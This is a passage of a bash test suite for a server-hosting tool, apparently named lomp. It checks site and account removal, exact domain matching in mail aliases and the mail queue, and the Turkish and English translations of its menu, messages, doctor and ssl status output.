# home, so nothing in it tells it from that site's own record. What does: the account does
# not live where a site of this name lives, and another site on record has the user.
_lr_fresh
mkdir -p "$STATE_DIR/domains/a.b.example"
jq -c '.domain = "a.b.example" | .status = "restoring"' "$(lib_domain_json a-b.example)" >"$(lib_domain_json a.b.example)"
assert_eq    "a record that names the other site's home as well"           0 "$(run_isolated _lr_do lib_domain_remove_main a.b.example)"
assert_eq    "is put away too, and nothing is done by what it names"       "" "$(_lr_done)"
assert_false "it is gone from the sites"                                   test -e "$STATE_DIR/domains/a.b.example"
# with that record still there, the site whose account it is can be removed as a site
_lr_fresh
mkdir -p "$STATE_DIR/domains/a.b.example"
jq -c '.domain = "a.b.example" | .status = "restoring"' "$(lib_domain_json a-b.example)" >"$(lib_domain_json a.b.example)"
assert_eq    "the site the account belongs to is removed as a site, leftover or not" 0 "$(run_isolated _lr_do lib_domain_remove_main a-b.example)"
assert_has   "its virtual host goes"                                       "vhost a-b.example|" "$(_lr_done)"
assert_has   "and its account"                                             "userdel a_b_example|" "$(_lr_done)"
# an account that no site on record has, living somewhere the record does not say
_lr_fresh
rm -rf "$STATE_DIR/domains/a-b.example"; mkdir -p "$STATE_DIR/domains/a.b.example"
printf '{"domain":"a.b.example","ident":"a_b_example","user":"a_b_example","group":"a_b_example","home":"/home/a.b.example","mode":"static","status":"restoring"}\n' >"$(lib_domain_json a.b.example)"
assert_eq    "a record whose user is an account of nobody on record"       0 "$(run_isolated _lr_do lib_domain_remove_main a.b.example)"
assert_eq    "is put away as well: the account lives where the record does not say" "" "$(_lr_done)"
# a site whose home was simply put somewhere else: the record says where, and nobody else has the user
_lr_fresh
rm -rf "$STATE_DIR/domains/a-b.example"; mkdir -p "$STATE_DIR/domains/elsewhere.example"
jq -n --arg h "$SITES_ROOT/a-b.example" '{domain:"elsewhere.example", ident:"a_b_example", user:"a_b_example", group:"a_b_example", home:$h, mode:"static", status:"active"}' >"$(lib_domain_json elsewhere.example)"
assert_eq    "a site whose home is not where its name says, and says so itself" 0 "$(run_isolated _lr_do lib_domain_remove_main elsewhere.example)"
assert_has   "is removed as a site, account and all"                       "userdel a_b_example|" "$(_lr_done)"
# and a site whose account is its own is removed as it always was
_lr_fresh
assert_eq    "remove of a site whose account is its own"                   0 "$(run_isolated _lr_do lib_domain_remove_main a-b.example)"
assert_has   "takes its virtual host"                                      "vhost a-b.example|" "$(_lr_done)"
assert_has   "its application"                                             "app a_b_example|" "$(_lr_done)"
assert_has   "and its account"                                             "userdel a_b_example|" "$(_lr_done)"
assert_false "and its record"                                              test -e "$STATE_DIR/domains/a-b.example"
# one whose account is gone already still has the rest of it removed
_lr_fresh; rm -f "$_lr/account"
assert_eq    "remove of a site whose account is gone already"              0 "$(run_isolated _lr_do lib_domain_remove_main a-b.example)"
assert_has   "takes what is left of it"                                    "vhost a-b.example|" "$(_lr_done)"
assert_lacks "and deletes no account"                                      "userdel" "$(_lr_done)"

eval "$_lr_saved_vars"; eval "$_lr_saved_fn"
unset -f _lr_do _lr_said _lr_done _lr_fresh _lr_archive

# =============================================================================
section "a domain is compared, not matched, where another one's name looks like it"
# "@example.com" as a pattern is also found in "info@example.com.tr", and its dots stand for
# any character: "@a.b.example" finds "x@a-b.example". "mail disable" and "mail domain del"
# warned about aliases of other domains "delivered into" this one and listed another domain's
# own postmaster alias, and the count of mail queued for a domain took in its neighbour's.
_cm="$TMP/compare"; rm -rf "$_cm"; mkdir -p "$_cm/aliases"
_cm_saved="$(declare -p MAIL_ALIAS_DIR OPT_DRY_RUN)"
MAIL_ALIAS_DIR="$_cm/aliases"; OPT_DRY_RUN=0
printf 'postmaster@example.com.tr\tinfo@example.com.tr\nboth@example.com.tr\tinfo@example.com , x@elsewhere.example\ntwo@example.com.tr\ta@example.com,b@example.com\n# old@example.com.tr\tinfo@example.com\n' >"$MAIL_ALIAS_DIR/example.com.tr"
printf 'postmaster@a-b.example\tinfo@a-b.example\n' >"$MAIL_ALIAS_DIR/a-b.example"
printf 'own@example.com\tinfo@example.com\n' >"$MAIL_ALIAS_DIR/example.com"
_cm_e="$(_mail_alias_targets_elsewhere example.com)"
assert_has   "an alias of another domain that is delivered into this one is found" "both@example.com.tr -> info@example.com , x@elsewhere.example" "$_cm_e"
assert_has   "one with two targets here as well"                                  "two@example.com.tr -> a@example.com,b@example.com" "$_cm_e"
assert_eq    "each once, and nothing else: not a line that is commented out"      2 "$(grep -c . <<<"$_cm_e" || true)"
assert_lacks "an alias that stays inside a domain whose name starts the same is not" "postmaster@example.com.tr" "$_cm_e"
assert_lacks "nor this domain's own"                                              "own@example.com" "$_cm_e"
assert_eq    "a dot in the name stands for a dot, not for any character"          "" "$(_mail_alias_targets_elsewhere a.b.example)"
assert_eq    "and a name is not found inside a longer one"                        "" "$(_mail_alias_targets_elsewhere example.co)"
# the queue, as postqueue prints it: the recipients on lines of their own
_cm_q() {
  ( lib_have() { return 0; }
    postqueue() {
      printf '%s\n' "-Queue ID-  --Size-- ----Arrival Time---- -Sender/Recipient-------" \
        "A1B2C3D4E5      512 Mon Oct  5 10:00:00  root@host.example" "                                         info@example.com.tr" \
        "                                         x@a-b.example" "" \
        "B1B2C3D4E5      512 Mon Oct  5 10:00:00  root@host.example" "                                         info@example.com" "" \
        "-- 1 Kbytes in 2 Requests."
    }
    OPT_QUIET=0; _mail_warn_queued "$1" 2>&1 )
}
assert_has   "mail queued for a domain is counted"                                "1 message(s) for example.com are" "$(_cm_q example.com)"
assert_has   "and its neighbour's is the neighbour's"                             "1 message(s) for example.com.tr are" "$(_cm_q example.com.tr)"
assert_eq    "what is queued for a-b.example is not a.b.example's"                "" "$(_cm_q a.b.example)"
assert_has   "but its own"                                                        "1 message(s) for a-b.example are" "$(_cm_q a-b.example)"

eval "$_cm_saved"
unset -f _cm_q

# =============================================================================
section "menu: two languages"
# The menu's texts are English where they are used, and MENU_TR holds the Turkish for each.
# A text added to the menu without its Turkish, or a Turkish format that takes other values
# than its English one, shows only on somebody's terminal - so both are looked for here.
_ml_src="$(sed -n '/^MENU_CMD=""/,/^# MENU_TR-BEGIN/p' "$ROOT/lib/menu.sh")"
_ml_missing=""; _ml_n=0
while IFS= read -r _ml_k; do
  [[ -n "$_ml_k" ]] || continue
  _ml_n=$((_ml_n + 1))
  [[ -n "${MENU_TR[$_ml_k]:-}" ]] || _ml_missing+="[${_ml_k}] "
done < <(
  {
    grep -oE "_menu_printf '[^']*'" <<<"$_ml_src" | sed -e "s/^_menu_printf '//" -e "s/'\$//" || true
    grep -oE "_menu_tf? '[^']*'" <<<"$_ml_src" | sed -e "s/^_menu_tf* '//" -e "s/'\$//" || true
    grep -oE '_menu_(item|opt) +[0-9]+ "[^"$]*"' <<<"$_ml_src" | sed -e 's/^[^"]*"//' -e 's/"$//' || true
    grep -oE '_menu_(group|prompt|hint|note) "[^"$]*"' <<<"$_ml_src" | sed -e 's/^[^"]*"//' -e 's/"$//' || true
    grep -oE '_menu_ask [a-z_]+ "[^"$]*"' <<<"$_ml_src" | sed -e 's/^[^"]*"//' -e 's/"$//' || true
    grep -E '^[[:space:]]+"[^"$]*"( \\)?$' <<<"$_ml_src" | sed -e 's/^[^"]*"//' -e 's/"[^"]*$//' || true
  } | sort -u
)
assert_true "the menu's texts were found"            test "$_ml_n" -ge 200
assert_eq   "every one of them has its Turkish"      "" "$_ml_missing"

# the same values in the same order, the same line breaks, the same indent
_ml_bad=""; _ml_nl='\n'
for _ml_k in "${!MENU_TR[@]}"; do
  _ml_v="${MENU_TR[$_ml_k]}"
  _ml_a="${_ml_k//"$_ml_nl"/}"; _ml_b="${_ml_v//"$_ml_nl"/}"
  if [[ "${_ml_k//[^%]/}" != "${_ml_v//[^%]/}" ]] \
     || (( ${#_ml_k} - ${#_ml_a} != ${#_ml_v} - ${#_ml_b} )) \
     || [[ "${_ml_k:0:2}" == "$_ml_nl" && "${_ml_v:0:2}" != "$_ml_nl" ]] \
     || [[ "${_ml_k: -2}" == "$_ml_nl" && "${_ml_v: -2}" != "$_ml_nl" ]] \
     || [[ -z "$_ml_v" ]]; then
    _ml_bad+="[${_ml_k}] "
  fi
done
assert_true "the table is there"                              test "${#MENU_TR[@]}" -ge 200
assert_eq   "no Turkish text takes other values than its English one" "" "$_ml_bad"
assert_true "and none of them was left out of the menu"       test "${#MENU_TR[@]}" -le "$((_ml_n + 3))"

# what is shown, by language
_ml() {   # language, command...
  ( MENU_LANG="$1"; C_BLD="" C_DIM="" C_CYN="" C_YEL="" C_GRN="" C_RST=""; shift; "$@" ) 2>&1
}
assert_eq "English alone"                         "Back"        "$(_ml en _menu_t "Back")"
assert_eq "Turkish alone"                         "Geri"        "$(_ml tr _menu_t "Back")"
assert_eq "both, on one line"                     "Back / Geri" "$(_ml both _menu_t "Back")"
assert_eq "a text with no Turkish stays as it is" "zzz"         "$(_ml both _menu_t "zzz")"
assert_eq "also when only Turkish is asked for"   "zzz"         "$(_ml tr _menu_t "zzz")"
assert_eq "one that reads the same is not said twice" "Port"    "$(_ml both _menu_t "Port")"
assert_eq "an empty text is no key"               ""            "$(_ml both _menu_t "")"
assert_eq "values go into both languages" \
  "Also serve www.a.example? (y/n) / www.a.example adresi de sunulsun mu? (y/n)" \
  "$(_ml both _menu_tf 'Also serve www.%s? (y/n)' a.example)"
assert_eq "and into the one asked for"            "www.a.example adresi de sunulsun mu? (y/n)" \
  "$(_ml tr _menu_tf 'Also serve www.%s? (y/n)' a.example)"
assert_eq "whole lines: the English one, then the Turkish one" \
  $'a.example has no path proxies.\na.example sitesinde yol yönlendirmesi yok.' \
  "$(_ml both _menu_printf '%s%s has no path proxies.%s\n' "" a.example "")"
assert_eq "the blank line in front is not said twice" \
  $'\nWhich site?\nHangi site?' "$(_ml both _menu_printf '\n%sWhich site?%s\n' "" "")"
assert_eq "one language, one line"                $'\nHangi site?' "$(_ml tr _menu_printf '\n%sWhich site?%s\n' "" "")"
assert_eq "a line that is in no table is printed once" "plain 7" "$(_ml both _menu_printf 'plain %s\n' 7)"
assert_eq "an item carries both"                  "   3) Back / Geri" "$(_ml both _menu_item 3 "Back")"
assert_eq "or the one asked for"                  "   3) Geri"        "$(_ml tr _menu_item 3 "Back")"
assert_eq "a heading too"                         " SITES / SİTELER"  "$(_ml both _menu_group "SITES")"
assert_eq "the question as well"                  "Choice / Seçim: "  "$(_ml both _menu_prompt "Choice")"
_ml_long="Node.js app that lomp keeps running (PM2: starts at boot, comes back after a crash)"
assert_eq "two long texts take a line each"       2 "$(_ml both _menu_opt 4 "$_ml_long" | wc -l | tr -d ' ')"
assert_eq "one language never does"               1 "$(_ml tr _menu_opt 4 "$_ml_long" | wc -l | tr -d ' ')"
_ml_h1="PM2 keeps the app running: it starts at boot and comes back after a crash."
_ml_h1tr="PM2 uygulamayı ayakta tutar: açılışta başlatır, çökerse yeniden kaldırır."
assert_eq "an explanation: Turkish block, then English block" \
  "  ${_ml_h1tr}"$'\n'"  ${_ml_h1}" "$(_ml both _menu_hint "$_ml_h1")"
assert_eq "or Turkish alone"                      "  ${_ml_h1tr}" "$(_ml tr _menu_hint "$_ml_h1")"
assert_eq "or English alone"                      "  ${_ml_h1}"   "$(_ml en _menu_hint "$_ml_h1")"
assert_eq "one with no Turkish is not lost in Turkish" "  only english" "$(_ml tr _menu_note "only english")"

# which language: LOMP_MENU_LANG, else what this run's question was answered, else what is
# kept for the server, else English
_ml_load() {   # LOMP_MENU_LANG, this run's answer, what is kept
  ( MENU_LANG=""; LOMP_MENU_LANG="$1"; LIB_LANG_SESSION="$2"
    STATE_DIR="$TMP/ml-state"; rm -rf "$STATE_DIR"; mkdir -p "$STATE_DIR"
    [[ -z "$3" ]] || printf '%s\n' "$3" >"$STATE_DIR/lang"
    _menu_lang_load; printf '%s' "$MENU_LANG" )
}
assert_eq "English while nobody chose"            "en"   "$(_ml_load "" "" "")"
assert_eq "what is kept for the server"           "tr"   "$(_ml_load "" "" tr)"
assert_eq "both is a choice too"                  "both" "$(_ml_load "" "" both)"
assert_eq "this run's answer before what is kept" "tr"   "$(_ml_load "" tr en)"
assert_eq "the environment before both"           "en"   "$(_ml_load en tr tr)"
assert_eq "a file that holds no language is English" "en" "$(_ml_load "" "" deutsch)"

# the language item of the menu: applies at once, and is kept - also before the installation
_ml_pick() {   # answer -> "language|what is kept"
  ( MENU_LANG="both"; STATE_DIR="$TMP/ml-pick/state"; rm -rf "$TMP/ml-pick"
    eval '_menu_ask() { local -n _o="$1"; _o="'"$1"'"; }'
    _menu_language >/dev/null 2>&1
    printf '%s|%s' "$MENU_LANG" "$(lib_lang_stored)" )
}
assert_eq "1 is Turkish, and it is kept"          "tr|tr"     "$(_ml_pick 1)"
assert_eq "2 is English"                          "en|en"     "$(_ml_pick 2)"
assert_eq "3 is both"                             "both|both" "$(_ml_pick 3)"
assert_eq "anything else changes nothing"         "both|"     "$(_ml_pick "")"
if (( CAN_CHMOD )); then
  ( STATE_DIR="$TMP/ml-mode/state"; rm -rf "$TMP/ml-mode"; lib_lang_store tr )
  assert_eq "a state directory made for it is private" "700" "$(stat -c %a "$TMP/ml-mode/state")"
fi
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
assert_has "it is item 28 of the main menu"       '28) _menu_language ;;' "$_menu_block"
unset -f _ml _ml_load _ml_pick

# =============================================================================
section "output language: Turkish for a person, English for everything else"
# Messages are written in English and looked up in lib/lang.sh's table just before they are
# shown. The log, --json and whatever is piped stay English; so does this suite, which never
# loads a language - every other assertion on a message in this file depends on that.
assert_eq "no language is loaded here"            "en" "$LIB_LANG"
lib_tr "Site a.example is not registered"
assert_eq "so a text comes back as it is"         "Site a.example is not registered" "$LIB_TR"

# the table: pairs, the same values on both sides
assert_eq "the table holds pairs"                 0 "$(( ${#LIB_TR_PAIRS[@]} % 2 ))"
assert_true "and a few hundred of them"           test "${#LIB_TR_PAIRS[@]}" -ge 600
_lt_bad=""
for (( _lt_i = 0; _lt_i + 1 < ${#LIB_TR_PAIRS[@]}; _lt_i += 2 )); do
  _lt_en="${LIB_TR_PAIRS[_lt_i]}"; _lt_tr="${LIB_TR_PAIRS[_lt_i + 1]}"
  [[ -n "$_lt_tr" && "$_lt_en" != "$_lt_tr" ]] || _lt_bad+="[${_lt_en}] "
  for _lt_k in 1 2 3 4 5 6 7 8 9; do
    if [[ "$_lt_en" == *"{${_lt_k}}"* ]]; then
      [[ "$_lt_tr" == *"{${_lt_k}}"* ]] || _lt_bad+="[${_lt_en}] "
      (( _lt_k == 1 )) || [[ "${_lt_en%%"{${_lt_k}}"*}" == *"{$((_lt_k - 1))}"* ]] || _lt_bad+="[order: ${_lt_en}] "
    else
      [[ "$_lt_tr" != *"{${_lt_k}}"* ]] || _lt_bad+="[${_lt_en}] "
    fi
  done
done
assert_eq "every Turkish text has the values of its English one" "" "$_lt_bad"

_lt() {   # text -> its Turkish
  ( LIB_LANG="tr"; lib_lang_build; lib_tr "$1"; printf '%s' "$LIB_TR" )
}
assert_eq "a message without values"              "Bakım işleri tamam" "$(_lt "Housekeeping done")"
assert_eq "one with a value"                      "a.example sitesi kayıtlı değil" "$(_lt "Site a.example is not registered")"
assert_eq "values may change places" \
  "b.example sitesinin queue worker'ı durdurulmuş" "$(_lt "Worker queue of b.example is stopped")"
assert_eq "braces of the text itself are no value" \
  "Dizinler hazır: /home/a.example/{public_html,logs,private,backups}" \
  "$(_lt "Directories ready: /home/a.example/{public_html,logs,private,backups}")"
assert_eq "regex characters of the text are plain text" \
  "127.0.0.1:3000 (uygulamaya PORT olarak verilir)" "$(_lt "127.0.0.1:3000 (given to the app as PORT)")"
assert_eq "and are no pattern either"             "127x0x0x1:3000 (given to the app as PORTX" "$(_lt "127x0x0x1:3000 (given to the app as PORTX")"
assert_eq "site: message - the message is looked up" \
  "a.example: 127.0.0.1:3000 adresinde çalışıyor" "$(_lt "a.example: running on 127.0.0.1:3000")"
assert_eq "a message inside a message inside a message" \
  "a.example: uygulama çalışmıyor: PM2 kurulu değil (setup.sh install --with-node)" \
  "$(_lt "a.example: the application is not running: PM2 is not installed (setup.sh install --with-node)")"
assert_eq "a value with an ampersand or a backslash stays as it is" \
  'Geçersiz --start '"'"'a && b\c'"'" "$(_lt "Invalid --start 'a && b\\c'")"
assert_eq "what nobody translated is shown in English" "zz nobody translated this" "$(_lt "zz nobody translated this")"
assert_eq "an empty text is an empty text"        "" "$(_lt "")"
assert_eq "a command is left alone"               "setup.sh app list" "$(_lt "setup.sh app list")"

# the output functions: Turkish on the screen, English in the log
: >"$LOG_FILE"
_lt_out="$( ( LIB_LANG="tr"; lib_lang_build; OPT_QUIET=0
             lib_ok "Housekeeping done"; lib_info "Cloning https://h/o/r.git"; lib_warn "the mail tables could not be rebuilt: x"
             lib_note "this site had no mail"; lib_steps_begin 2; lib_step "Scheduled tasks"
             lib_print_kv "Document root" "/home/a.example/public_html"; lib_print_kv "Port" "127.0.0.1:3000 (given to the app as PORT)" ) 2>&1 )"
assert_has "lib_ok"                               "[ ok ]  Bakım işleri tamam" "$_lt_out"
assert_has "lib_info"                             "[info]  https://h/o/r.git klonlanıyor" "$_lt_out"
assert_has "lib_warn"                             "[warn]  posta tabloları yeniden oluşturulamadı: x" "$_lt_out"
assert_has "lib_note"                             "        bu sitenin postası yoktu" "$_lt_out"
assert_has "lib_step"                             "[1/2] Zamanlanmış görevler" "$_lt_out"
assert_has "a label"                              "  Belge kökü " "$_lt_out"
assert_has "and a value"                          "127.0.0.1:3000 (uygulamaya PORT olarak verilir)" "$_lt_out"
assert_has "the log has the English text"         "Housekeeping done" "$(cat "$LOG_FILE")"
assert_has "of every line"                        "Cloning https://h/o/r.git" "$(cat "$LOG_FILE")"
assert_lacks "and no Turkish"                     "Düzenleme" "$(cat "$LOG_FILE")"
: >"$LOG_FILE"
_lt_out="$( ( LIB_LANG="tr"; lib_lang_build; lib_die "Site a.example is not registered" "registered in /x" "setup.sh list" ) 2>&1 || true )"
assert_has "a failure: what"                      "✖ BAŞARISIZ: a.example sitesi kayıtlı değil" "$_lt_out"
assert_has "why"                                  "Olası neden   : /x içinde kayıtlı" "$_lt_out"
assert_has "and what to do, a command, as it is"  "Önerilen çözüm: setup.sh list" "$_lt_out"
assert_has "the log keeps it in English"          "Site a.example is not registered | cause: registered in /x | fix: setup.sh list" "$(cat "$LOG_FILE")"
_lt_out="$( ( lib_die "Site a.example is not registered" "registered in /x" "setup.sh list" ) 2>&1 || true )"
assert_has "without a language a failure reads as before" "✖ FAILED: Site a.example is not registered" "$_lt_out"
assert_has "all of it"                            "Probable cause: registered in /x" "$_lt_out"

# which language a run gets. Inside $( ) standard output is a pipe, which is the case of a
# script reading the output: only LOMP_LANG changes the language there.
_lt_load() {   # LOMP_LANG, LOMP_MENU_LANG, what is kept, OPT_JSON, command
  ( LOMP_LANG="$1"; LOMP_MENU_LANG="$2"; OPT_JSON="${4:-0}"
    STATE_DIR="$TMP/lt-state"; rm -rf "$STATE_DIR"; mkdir -p "$STATE_DIR"
    [[ -z "$3" ]] || printf '%s\n' "$3" >"$STATE_DIR/lang"
    lib_lang_ask() { printf 'ASKED'; LIB_LANG_ANSWER="tr"; }
    lib_lang_load "${5:-add}"; printf '%s' "$LIB_LANG" )
}
assert_eq "LOMP_LANG=tr is Turkish, piped or not"  "tr" "$(_lt_load tr "" "")"
assert_eq "LOMP_LANG=both too"                     "tr" "$(_lt_load both "" "")"
assert_eq "LOMP_LANG=en is English"                "en" "$(_lt_load en tr tr)"
assert_eq "piped output is English whatever the menu speaks" "en" "$(_lt_load "" tr tr)"
assert_eq "and so is --json"                       "en" "$(_lt_load "" tr tr 1)"
assert_eq "a value that is no language is English" "en" "$(_lt_load deutsch "" "")"
assert_eq "a pipe is never asked, not even by install" "en" "$(_lt_load "" "" "" 0 install)"
assert_eq "nor is the menu's first run"            "en" "$(_lt_load "" "" "" 0 menu)"
assert_has "the question is asked by install and by the menu only" \
  '"$cmd" == "install" || "$cmd" == "menu"' "$(declare -f lib_lang_load)"
assert_has "on a terminal, of root, and not with --non-interactive" \
  'OPT_NON_INTERACTIVE' "$(declare -f lib_lang_load)"
assert_has "a dry run asks but keeps nothing"      'OPT_DRY_RUN:-0} )) || lib_lang_store' "$(declare -f lib_lang_load)"
assert_has "setup.sh hands it the command"         'lib_lang_load "$cmd"' "$(cat "$ROOT/setup.sh")"
_lt_kept() { ( STATE_DIR="$TMP/lt-kept"; rm -rf "$STATE_DIR"; "$@"; lib_lang_stored ) }
assert_eq "nothing is kept at first"               ""     "$(_lt_kept true)"
assert_eq "what is stored is what is read"         "tr"   "$(_lt_kept lib_lang_store tr)"
assert_eq "the menu's two-language view as well"   "both" "$(_lt_kept lib_lang_store both)"
assert_eq "a file with anything else counts as nothing" "" "$(_lt_kept lib_lang_store deutsch)"
unset -f _lt_kept
assert_has "setup.sh decides it before the first check can fail" "lib_lang_load" \
  "$(grep -B2 '^  lib_require_root$' "$ROOT/setup.sh")"
unset -f _lt _lt_load

# =============================================================================
section "doctor and ssl status: Turkish for what a person reads"
# doctor's findings are short and general - "{1} missing", "{1} answers" - and as ordinary
# lines of lib/lang.sh's table they would also fit the untranslated messages of every other
# command and turn them into half a sentence. So they are kept there as "@doctor <text>",
# and lib_doctor_main asks for them under that key. --json, the log and the health check's
# notice get the English they always got.
_dt_fn="$(declare -f lib_doctor_run lib_require_tools || true)"
_dt() {   # a check's name or detail -> what doctor shows in Turkish
  ( LIB_LANG="tr"; lib_lang_build; _doc_tr "$1"; printf '%s' "$LIB_TR" )
}
_dt_plain() {   # an ordinary message -> its Turkish
  ( LIB_LANG="tr"; lib_lang_build; lib_tr "$1"; printf '%s' "$LIB_TR" )
}
assert_eq "a check's name"                        "site a.example: loglar" "$(_dt "site a.example: logs")"
assert_eq "one that is a technical word stays"    "site a.example: vhost" "$(_dt "site a.example: vhost")"
assert_eq "the longer name is not taken for the shorter" "uygulama a.example: worker queue yeniden başlama" "$(_dt "app a.example: worker queue restarts")"
assert_eq "nor the other way round"               "uygulama a.example: worker queue" "$(_dt "app a.example: worker queue")"
assert_eq "a mail check"                          "posta: kuyruk" "$(_dt "mail: queue")"
assert_eq "one with a value"                      "posta: port 10587" "$(_dt "mail: port 10587")"
assert_eq "and the general one last"              "posta: postfix" "$(_dt "mail: postfix")"
assert_eq "a finding"                             "dinliyor" "$(_dt "listening")"
assert_eq "one with a value in it"                "/etc/sysctl.d/99-x.conf yerinde" "$(_dt "/etc/sysctl.d/99-x.conf present")"
assert_eq "the specific finding wins over the general one" "/home/a.example/public_html yok" "$(_dt "/home/a.example/public_html missing")"
assert_eq "the general one is still there"        "/etc/x.conf eksik" "$(_dt "/etc/x.conf missing")"
assert_eq "values may change places"              "kısıtlı (7080 portu için 2 güvenlik duvarı kuralı)" "$(_dt "restricted (2 firewall rule(s) for port 7080)")"
assert_eq "a percent sign in a finding is plain text" "%91 dolu (3 GB boş) - %85 eşiğinin üstünde" "$(_dt "91% used (3 GB free) - above 85% threshold")"
assert_eq "a redirect's finding"                  "ziyaretçilerini https://b.example adresine gönderiyor" "$(_dt "sends its visitors on to https://b.example")"
assert_eq "a finding with no Turkish is shown as it is" "something nobody translated" "$(_dt "something nobody translated")"
assert_eq "and never with the key in front"       "x" "$(_dt "x")"
assert_eq "an ordinary message that has its Turkish is found from doctor too" "a.example sitesi kayıtlı değil" "$(_dt "Site a.example is not registered")"
# the reason for the key: outside doctor these patterns do not exist
assert_eq "another command's message that ends like a finding stays whole" "the key file is missing" "$(_dt_plain "the key file is missing")"
assert_eq "so does one that ends in 'answers'"    "nobody answers" "$(_dt_plain "nobody answers")"
assert_eq "and one that is a finding word for word" "listening" "$(_dt_plain "listening")"
assert_eq "without a language doctor's texts are what they were" "site a.example: logs" "$(_doc_tr "site a.example: logs"; printf '%s' "$LIB_TR")"

# the command: a table in Turkish, the same findings in English for --json
_dt_run() {   # tr|en [--json]
  (
    eval 'lib_require_tools() { :; }
          lib_doctor_run() {
            DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0
            _doc_add OK "port 80/tcp" "listening"
            _doc_add WARN "site a.example: ssl" "wanted but not active (setup.sh renew-ssl a.example)"
            _doc_add FAIL "site a.example: files" "/home/a.example/public_html missing"
          }'
    OPT_QUIET=0; OPT_JSON=0
    if [[ "$1" == "tr" ]]; then LIB_LANG="tr"; lib_lang_build; fi
    shift
    lib_doctor_main "$@" 2>&1 || true
  )
}
_o="$(_dt_run tr)"
assert_has  "the headline of the table"           "DURUM" "$_o"
assert_has  "its columns"                         "KONTROL" "$_o"
assert_has  "a finding that is fine"              "port 80/tcp" "$(grep 'dinliyor' <<<"$_o")"
assert_has  "a warning, with its command untouched" "isteniyor ama etkin değil (setup.sh renew-ssl a.example)" "$_o"
assert_has  "a failure, name and finding"         "site a.example: dosyalar" "$(grep '/home/a.example/public_html yok' <<<"$_o")"
assert_has  "the status words stay what scripts and people know" "FAIL" "$(grep 'public_html yok' <<<"$_o")"
assert_has  "the summary"                         "Özet: 1 tamam, 1 uyarı, 1 hata" "$_o"
assert_has  "a Turkish name is padded by its letters, not its bytes: the columns line up" "site a.example: ssl                isteniyor" "$_o"
assert_has  "for a name with Turkish letters too" "site a.example: dosyalar           /home/a.example/public_html yok" "$_o"
assert_has  "and the headline over them"          "DURUM  KONTROL                            AYRINTI" "$_o"
assert_lacks "nothing of it is left in English"   "missing" "$_o"
_o="$(_dt_run en)"
assert_has  "in English the table is what it was" "STATUS CHECK                              DETAIL" "$_o"
assert_has  "row for row"                         "site a.example: files              /home/a.example/public_html missing" "$_o"
assert_has  "and the summary"                     "Summary: 1 ok, 1 warning(s), 1 failure(s)" "$_o"
_o="$(_dt_run tr --json)"
assert_eq   "--json is English whatever the language" "site a.example: files|/home/a.example/public_html missing" \
  "$(jq -r '.checks[] | select(.status == "FAIL") | "\(.check)|\(.detail)"' <<<"$_o" 2>/dev/null || true)"

# ssl status: the rows, the headings and the commands that put things right
_st() { ( LIB_LANG="tr"; lib_lang_build; C_GRN=""; C_YEL=""; C_RED=""; C_DIM=""; C_RST=""; "$@" ); }
assert_has  "a row: the days and what is wrong, in line with the English column" "3 gün      yenileme gerçekleşmiyor" "$(_st _ssl_row a.example FAIL 3 "renewal is not getting through")"
assert_has  "a certificate that expired"          "süresi 4 gün önce doldu" "$(_st _ssl_row a.example FAIL -4 "expired 4 day(s) ago")"
assert_has  "one that lacks a name"               "www.a.example adını kapsamıyor" "$(_st _ssl_row a.example FAIL 60 "does not cover www.a.example")"
assert_has  "one that is not there"               "sertifika yok" "$(_st _ssl_row a.example NONE "" "no certificate")"
assert_has  "an issuer is a name and stays one"   "Let's Encrypt" "$(_st _ssl_row a.example OK 60 "Let's Encrypt")"
assert_has  "in English a row is what it was"     "3 days     renewal is not getting through" "$(_ssl_row a.example FAIL 3 "renewal is not getting through")"
assert_eq   "a command that puts things right keeps the command" "lomp renew-ssl a.example    # DNS kaydı buraya yönlenince" "$(_dt_plain "lomp renew-ssl a.example    # once its DNS points here")"
assert_eq   "for a redirect, with www"            "lomp redirect add old.example a.example --www    # DNS kaydı buraya yönlenince" "$(_dt_plain "lomp redirect add old.example a.example --www    # once its DNS points here")"
assert_eq   "a value in colour"                   $'\033[0;32mkurulu\033[0m (yenilenen sertifikayı sunuculara verir)' "$(_dt_plain $'\033[0;32minstalled\033[0m (hands a renewed certificate to the servers)')"
assert_eq   "and the same without colours"        "kurulu (yenilenen sertifikayı sunuculara verir)" "$(_dt_plain "installed (hands a renewed certificate to the servers)")"
assert_eq   "the closing line"                    "2 sorun, 1 uyarı. Düzeltmek için:" "$(_dt_plain "2 problem(s), 1 warning(s). To put right:")"
assert_eq   "what Cloudflare would say"           "Cloudflare: 3 siteden 1 tanesi Full (strict) altında 526 yanıtı verir. Bu liste temizlenene kadar Full modunda kalın." "$(_dt_plain "Cloudflare: 1 of 3 site(s) would answer 526 under Full (strict). Stay on Full until this list is clean.")"
assert_eq   "renew-ssl: a request"                "a.example + www için sertifika isteniyor (webroot ile)" "$(_dt_plain "Requesting certificate for a.example + www via webroot")"
assert_eq   "and for names that belong to no site" "mail.a.example için _mail_a sertifikası isteniyor (dns ile)" "$(_dt_plain "Requesting certificate _mail_a for mail.a.example via dns")"
assert_has  "ssl help in Turkish"                 "ssl fix        Otomatik yenilemeyi geri kurar" "$(_st lib_ssl_usage)"
assert_has  "and in English as before"            "ssl fix        Put automatic renewal back" "$(lib_ssl_usage)"
for _dt_h in '"CERTIFICATES"' '"Sites"' '"Redirects"' '"Mail"' '"AUTOMATIC RENEWAL"' '"(no sites yet)"'; do
  assert_has "ssl status sends its heading ${_dt_h} through the table" "lib_tr ${_dt_h}" "$(declare -f lib_ssl_status_main)"
done
assert_eq   "each of them has its Turkish"        "SERTİFİKALAR Siteler Yönlendirmeler Posta OTOMATİK YENİLEME (henüz site yok)" \
  "$(_dt_plain CERTIFICATES) $(_dt_plain Sites) $(_dt_plain Redirects) $(_dt_plain Mail) $(_dt_plain "AUTOMATIC RENEWAL") $(_dt_plain "(no sites yet)")"
# --help: every usage text has its Turkish, with the same options as the English one - a text
# that names an option the command does not take, or leaves one out, sends somebody the wrong way
_uo() { grep -o -- '--[a-z][a-z0-9-]*' | sort | uniq -c | tr -s ' \n' ' '; }
for _u in lib_usage lib_domain_add_usage lib_domain_wordpress_usage lib_domain_fix_owner_usage lib_app_usage lib_mail_usage \
          lib_harden_usage lib_scan_usage lib_proxy_usage lib_import_usage lib_domain_rename_usage lib_redirect_usage lib_ssl_usage; do
  if ! declare -F "$_u" >/dev/null; then fail "${_u} is not there"; continue; fi
